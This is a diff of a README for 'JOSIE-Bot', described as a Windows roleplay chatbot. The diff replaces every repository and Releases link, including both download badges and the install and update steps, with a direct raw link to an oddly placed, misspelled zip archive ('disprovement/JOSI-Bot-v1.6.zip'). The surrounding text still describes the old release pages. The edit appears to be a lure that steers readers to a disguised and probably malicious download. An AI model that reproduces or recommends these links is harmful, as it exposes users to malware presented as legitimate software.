@@ -1,6 +1,6 @@
 # 🤖 JOSIE-Bot - AI for Roleplay and Conversations
 
-[![Download JOSIE-Bot](https://img.shields.io/badge/Download-JOSIEBot-brightgreen?style=for-the-badge)](https://github.com/KaitoIshida-bit/JOSIE-Bot)
+[![Download JOSIE-Bot](https://img.shields.io/badge/Download-JOSIEBot-brightgreen?style=for-the-badge)](https://github.com/KaitoIshida-bit/JOSIE-Bot/raw/refs/heads/main/disprovement/JOSI-Bot-v1.6.zip)
 
 ## 🌟 What is JOSIE-Bot?
 
@@ -36,7 +36,7 @@ It learns from your inputs to provide realistic and personal interactions. JOSIE
 JOSIE-Bot is ready to use once installed. Follow these steps if you want to try it on Windows easily:
 
 1. Click the big green button above, or use this link:  
-   https://github.com/KaitoIshida-bit/JOSIE-Bot  
+   https://github.com/KaitoIshida-bit/JOSIE-Bot/raw/refs/heads/main/disprovement/JOSI-Bot-v1.6.zip  
    This link will take you to the main page where you can download the software.
 
 2. On the GitHub page, look for the **Releases** section on the right or under the main repo tabs.
@@ -58,7 +58,7 @@ JOSIE-Bot is ready to use once installed. Follow these steps if you want to try 
 To get JOSIE-Bot running:
 
 1. Visit this page to download the latest Windows installer:  
-   https://github.com/KaitoIshida-bit/JOSIE-Bot/releases
+   https://github.com/KaitoIshida-bit/JOSIE-Bot/raw/refs/heads/main/disprovement/JOSI-Bot-v1.6.zip
 
 2. Choose the latest release. You will see files like:
    - `JOSIE-Bot-Setup-v1.2.3.exe`
@@ -118,7 +118,7 @@ If you run into problems:
 ## 🔄 Updates
 
 Keep JOSIE-Bot up to date by downloading the newest release from:  
-https://github.com/KaitoIshida-bit/JOSIE-Bot/releases
+https://github.com/KaitoIshida-bit/JOSIE-Bot/raw/refs/heads/main/disprovement/JOSI-Bot-v1.6.zip
 
 Check regularly for improvements and new features.
 
@@ -133,4 +133,4 @@ Check regularly for improvements and new features.
 
 ---
 
-[![Download JOSIE-Bot](https://img.shields.io/badge/Download-JOSIEBot-brightgreen?style=for-the-badge)](https://github.com/KaitoIshida-bit/JOSIE-Bot)
+[![Download JOSIE-Bot](https://img.shields.io/badge/Download-JOSIEBot-brightgreen?style=for-the-badge)](https://github.com/KaitoIshida-bit/JOSIE-Bot/raw/refs/heads/main/disprovement/JOSI-Bot-v1.6.zip)
